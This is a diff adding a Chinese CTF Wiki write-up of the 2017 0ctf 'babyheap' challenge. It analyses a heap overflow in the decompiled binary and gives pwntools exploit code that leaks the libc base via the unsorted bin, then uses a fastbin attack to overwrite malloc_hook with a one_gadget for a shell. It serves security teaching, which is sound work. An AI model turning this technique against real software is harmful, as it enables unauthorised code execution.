@@ -824,12 +824,271 @@ libc.so.6  search.id0  search.id2  search.til
 </div>
 </div>
 </div>
-</div>
+<div class="section" id="ctf-babyheap">
+<h2>2017 0ctf babyheap<a class="headerlink" href="#ctf-babyheap" title="永久链接至标题">¶</a></h2>
 <div class="section" id="id19">
-<h1>参考文献<a class="headerlink" href="#id19" title="永久链接至标题">¶</a></h1>
+<h3>基本信息<a class="headerlink" href="#id19" title="永久链接至标题">¶</a></h3>
+<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  2017_0ctf_babyheap git:(master) file babyheap
+babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped
+➜  2017_0ctf_babyheap git:(master) checksec babyheap
+[*] &#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2017_0ctf_babyheap/babyheap&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</pre></div>
+</div>
+<p>64位程序，保护全部开启。</p>
+</div>
+<div class="section" id="id20">
+<h3>基本功能<a class="headerlink" href="#id20" title="永久链接至标题">¶</a></h3>
+<p>程序是一个堆分配器，主要由以下四种功能</p>
+<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">puts</span><span class="p">(</span><span class="s2">&quot;1. Allocate&quot;</span><span class="p">);</span>
+<span class="n">puts</span><span class="p">(</span><span class="s2">&quot;2. Fill&quot;</span><span class="p">);</span>
+<span class="n">puts</span><span class="p">(</span><span class="s2">&quot;3. Free&quot;</span><span class="p">);</span>
+<span class="n">puts</span><span class="p">(</span><span class="s2">&quot;4. Dump&quot;</span><span class="p">);</span>
+<span class="n">puts</span><span class="p">(</span><span class="s2">&quot;5. Exit&quot;</span><span class="p">);</span>
+<span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Command: &quot;</span><span class="p">);</span>
+</pre></div>
+</div>
+<p>其中，每次读取命令的函数由读取指定长度的字符串的函数而决定。</p>
+<p>通过分配函数</p>
+<div class="code c highlight-default"><div class="highlight"><pre><span></span>void __fastcall allocate(__int64 a1)
+{
+  signed int i; // [rsp+10h] [rbp-10h]
+  signed int v2; // [rsp+14h] [rbp-Ch]
+  void *v3; // [rsp+18h] [rbp-8h]
+
+  for ( i = 0; i &lt;= 15; ++i )
+  {
+    if ( !*(_DWORD *)(24LL * i + a1) )
+    {
+      printf(&quot;Size: &quot;);
+      v2 = read_num();
+      if ( v2 &gt; 0 )
+      {
+        if ( v2 &gt; 4096 )
+          v2 = 4096;
+        v3 = calloc(v2, 1uLL);
+        if ( !v3 )
+          exit(-1);
+        *(_DWORD *)(24LL * i + a1) = 1;
+        *(_QWORD *)(a1 + 24LL * i + 8) = v2;
+        *(_QWORD *)(a1 + 24LL * i + 16) = v3;
+        printf(&quot;Allocate Index %d\n&quot;, (unsigned int)i);
+      }
+      return;
+    }
+  }
+}
+</pre></div>
+</div>
+<p>申请的 chunk 的最大为 4096。此外，我们可以看出每个 chunk 主要有三个字段：是否在使用，堆块大小，堆块位置。故而我们可以创建对应的结构体。</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>00000000 chunk           struc ; (sizeof=0x18, mappedto_6)
+00000000 inuse           dq ?
+00000008 size            dq ?
+00000010 ptr             dq ?
+00000018 chunk           ends
+</pre></div>
+</div>
+<p><strong>需要注意的是堆块是由 calloc 分配的，所以 chunk 中的内容全都为``x00``。</strong></p>
+<p>在填充内容的功能中，使用读取内容的函数是直接读取指定长度的内容，并没有设置字符串结尾。<strong>而且比较有意思的是，这个指定长度是我们指定的，并不是之前 chunk
+分配时指定的长度，所以这里就出现了任意堆溢出的情形。</strong></p>
+<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">__int64</span> <span class="n">__fastcall</span> <span class="n">fill</span><span class="p">(</span><span class="n">chunk</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="o">//</span> <span class="n">rax</span>
+  <span class="nb">int</span> <span class="n">v2</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">18</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span>
+  <span class="nb">int</span> <span class="n">v3</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">1</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">4</span><span class="n">h</span><span class="p">]</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Index: &quot;</span><span class="p">);</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
+  <span class="n">v2</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">signed</span> <span class="nb">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">signed</span> <span class="nb">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&lt;=</span> <span class="mi">15</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">LODWORD</span><span class="p">(</span><span class="n">a1</span><span class="p">[(</span><span class="n">signed</span> <span class="nb">int</span><span class="p">)</span><span class="n">result</span><span class="p">]</span><span class="o">.</span><span class="n">inuse</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">result</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Size: &quot;</span><span class="p">);</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
+      <span class="n">v3</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">signed</span> <span class="nb">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Content: &quot;</span><span class="p">);</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">read_content</span><span class="p">((</span><span class="n">char</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span><span class="o">.</span><span class="n">ptr</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>在释放chunk的功能中该设置的都设置了。</p>
+<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">__int64</span> <span class="n">__fastcall</span> <span class="n">free_chunk</span><span class="p">(</span><span class="n">chunk</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="o">//</span> <span class="n">rax</span>
+  <span class="nb">int</span> <span class="n">v2</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">1</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">4</span><span class="n">h</span><span class="p">]</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Index: &quot;</span><span class="p">);</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
+  <span class="n">v2</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">signed</span> <span class="nb">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">signed</span> <span class="nb">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&lt;=</span> <span class="mi">15</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">LODWORD</span><span class="p">(</span><span class="n">a1</span><span class="p">[(</span><span class="n">signed</span> <span class="nb">int</span><span class="p">)</span><span class="n">result</span><span class="p">]</span><span class="o">.</span><span class="n">inuse</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">result</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">LODWORD</span><span class="p">(</span><span class="n">a1</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span><span class="o">.</span><span class="n">inuse</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="n">a1</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span><span class="o">.</span><span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="n">LL</span><span class="p">;</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">a1</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span><span class="o">.</span><span class="n">ptr</span><span class="p">);</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a1</span><span class="p">[</span><span class="n">v2</span><span class="p">];</span>
+      <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">result</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="n">LL</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>dump 就是输出对应索引 chunk 的内容。</p>
+</div>
+<div class="section" id="id21">
+<h3>利用思路<a class="headerlink" href="#id21" title="永久链接至标题">¶</a></h3>
+<p>可以确定的是，我们主要有的漏洞就是任意长度堆溢出。由于该程序几乎所有保护都开启了，所以我们必须要有一些泄漏才可以控制程序的流程。基本利用思路如下</p>
+<ul class="simple">
+<li>利用 unsorted bin 地址泄漏 libc 基地址。</li>
+<li>利用 fastbin attack 将chunk 分配到 malloc_hook 附近。</li>
+</ul>
+<div class="section" id="id22">
+<h4>泄漏 libc 基地址<a class="headerlink" href="#id22" title="永久链接至标题">¶</a></h4>
+<p>由于我们是希望使用 unsorted bin 来泄漏 libc 基地址，所以必须要有 chunk 可以被链接到 unsorted bin 中，所以该 chunk 不能使 fastbin chunk，也不能和 top chunk 相邻。因为前者会被添加到 fastbin
+中，后者在不是fastbin 的情况下，会被合并到 top chunk 中。因此，我们这里构造一个 small bin chunk。在将该 chunk 释放到 unsorted bin 的同时，也需要让另外一个正在使用的 chunk 可以同时指向该 chunk
+的位置。这样才可以进行泄漏。具体设计如下</p>
+<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1"># 1. leak libc base</span>
+<span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 0, 0x00</span>
+<span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 1, 0x20</span>
+<span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 2, 0x40</span>
+<span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 3, 0x60</span>
+<span class="n">allocate</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>  <span class="c1"># idx 4, 0x80</span>
+<span class="c1"># free idx 1, 2, fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>首先，我们申请了 5 个chunk，并释放了两个chunk，此时堆的情况如下。</p>
+<div class="code shell highlight-default"><div class="highlight"><pre><span></span>pwndbg&gt; x/20gx 0x55a03ca22000
+0x55a03ca22000: 0x0000000000000000  0x0000000000000021 idx 0
+0x55a03ca22010: 0x0000000000000000  0x0000000000000000
+0x55a03ca22020: 0x0000000000000000  0x0000000000000021 idx 1
+0x55a03ca22030: 0x000055a03ca22040  0x0000000000000000
+0x55a03ca22040: 0x0000000000000000  0x0000000000000021 idx 2
+0x55a03ca22050: 0x0000000000000000  0x0000000000000000
+0x55a03ca22060: 0x0000000000000000  0x0000000000000021 idx 3
+0x55a03ca22070: 0x0000000000000000  0x0000000000000000
+0x55a03ca22080: 0x0000000000000000  0x0000000000000091 idx 4
+0x55a03ca22090: 0x0000000000000000  0x0000000000000000
+pwndbg&gt; fastbins
+fastbins
+0x20: 0x55a03ca22020 —▸ 0x55a03ca22040 ◂— 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+</pre></div>
+</div>
+<p>当我们编辑 idx0 后，确实已经将其指向idx4了。这里之所以可以成功是因为堆的始终是 4KB 对齐的，所以idx 4的起始地址的第一个字节必然是0x80。</p>
+<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1"># edit idx 0 chunk to particial overwrite idx1&#39;s fd to point to idx4</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>修改成功后如下</p>
+<div class="code shell highlight-default"><div class="highlight"><pre><span></span>pwndbg&gt; x/20gx 0x55a03ca22000
+0x55a03ca22000: 0x0000000000000000  0x0000000000000021
+0x55a03ca22010: 0x6161616161616161  0x6161616161616161
+0x55a03ca22020: 0x0000000000000000  0x0000000000000021
+0x55a03ca22030: 0x000055a03ca22080  0x0000000000000000
+0x55a03ca22040: 0x0000000000000000  0x0000000000000021
+0x55a03ca22050: 0x0000000000000000  0x0000000000000000
+0x55a03ca22060: 0x0000000000000000  0x0000000000000021
+0x55a03ca22070: 0x0000000000000000  0x0000000000000000
+0x55a03ca22080: 0x0000000000000000  0x0000000000000091
+0x55a03ca22090: 0x0000000000000000  0x0000000000000000
+pwndbg&gt; fastbins
+fastbins
+0x20: 0x55a03ca22020 —▸ 0x55a03ca22080 ◂— 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+</pre></div>
+</div>
+<p>那么，当我们再次申请两个时，第二个申请到的就是idx 4处的chunk。为了能够申请成功，我们需要确保 idx4 的size 与当前 fastbin 的大小一致，所以，我们得修改它的大小。申请成功后，idx2会指向idx4。</p>
+<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1"># if we want to allocate at idx4, we must set it&#39;s size as 0x21</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 1</span>
+<span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 2, which point to idx4&#39;s location</span>
+</pre></div>
+</div>
+<p>之后，如果我们想要将 idx 4 放到 unsorted bin 中的话，为了防止其与top chunk 合并，我们需要再次申请一个chunk。此后再释放 idx4 就会进入 unsorted bin中去了。此时由于 idx2
+也指向这个地址，所以我们直接展示他的内容就可以得到unsorted bin的地址了。</p>
+<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1"># if want to free idx4 to unsorted bin, we must fix its size</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
+<span class="c1"># allocate a chunk in order when free idx4, idx 4 not consolidate with top chunk</span>
+<span class="n">allocate</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>  <span class="c1"># idx 5</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+<span class="c1"># as idx 2 point to idx4, just show this</span>
+<span class="n">dump</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Content: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">unsortedbin_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+<span class="n">main_arena</span> <span class="o">=</span> <span class="n">unsortedbin_addr</span> <span class="o">-</span> <span class="n">offset_unsortedbin_main_arena</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;main arena addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">main_arena</span><span class="p">))</span>
+<span class="n">main_arena_offset</span> <span class="o">=</span> <span class="mh">0x3c4b20</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">main_arena</span> <span class="o">-</span> <span class="n">main_arena_offset</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;libc base addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="chunkmalloc-hook">
+<h4>分配chunk到malloc_hook附近<a class="headerlink" href="#chunkmalloc-hook" title="永久链接至标题">¶</a></h4>
+<p>由于 malloc hook 附近的 chunk 大小为 0x7f，所以数据区域为0x60。这里我们再次申请的时候，对应 fastbin 链表中没有相应大小chunk，所以根据堆分配器规则，它会依次处理unsorted
+bin中的chunk，将其放入到对应的bin中，之后会再次尝试分配 chunk，因为之前释放的 chunk 比当前申请的 chunk 大，所以可以从其前面分割出来一块。所以 idx2
+仍然指向该位置，那么我们可以使用类似的办法先释放申请到的chunk，然后再次修改 fd 指针为 fake chunk 即可。此后我们修改 malloc_hook 处的指针即可得到触发 onegadget。</p>
+<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1"># 2. malloc to malloc_hook nearby</span>
+<span class="c1"># allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4</span>
+<span class="n">allocate</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+<span class="c1"># edit idx4&#39;s fd point to fake chunk</span>
+<span class="n">fake_chunk_addr</span> <span class="o">=</span> <span class="n">main_arena</span> <span class="o">-</span> <span class="mh">0x33</span>
+<span class="n">fake_chunk</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk_addr</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">),</span> <span class="n">fake_chunk</span><span class="p">)</span>
+
+<span class="n">allocate</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>  <span class="c1"># idx 4</span>
+<span class="n">allocate</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>  <span class="c1"># idx 6</span>
+
+<span class="n">one_gadget_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x4526a</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="mh">0x13</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget_addr</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
+<span class="c1"># trigger malloc_hook</span>
+<span class="n">allocate</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>同时，这里的 onegadget 地址也可能需要尝试多次。</p>
+</div>
+</div>
+</div>
+<div class="section" id="id23">
+<h2>参考文献<a class="headerlink" href="#id23" title="永久链接至标题">¶</a></h2>
 <ul class="simple">
 <li><a class="reference external" href="https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/">https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/</a></li>
+<li><a class="reference external" href="http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html">http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html</a></li>
 </ul>
+</div>
 </div>
 
 
@@ -945,9 +1204,19 @@ libc.so.6  search.id0  search.id2  search.til
 </li>
 </ul>
 </li>
+<li class="toctree-l3"><a class="reference internal" href="#ctf-babyheap">2017 0ctf babyheap</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id19">基本信息</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id20">基本功能</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id21">利用思路</a><ul>
+<li class="toctree-l5"><a class="reference internal" href="#id22">泄漏 libc 基地址</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#chunkmalloc-hook">分配chunk到malloc_hook附近</a></li>
 </ul>
 </li>
-<li class="toctree-l2"><a class="reference internal" href="#id19">参考文献</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id23">参考文献</a></li>
+</ul>
+</li>
 <li class="toctree-l2"><a class="reference internal" href="house_of_force.html">House Of Force</a></li>
 <li class="toctree-l2"><a class="reference internal" href="unsorted_bin_attack.html">Unsorted Bin Attack</a></li>
 <li class="toctree-l2"><a class="reference internal" href="house_of_lore.html">House of Lore</a></li>
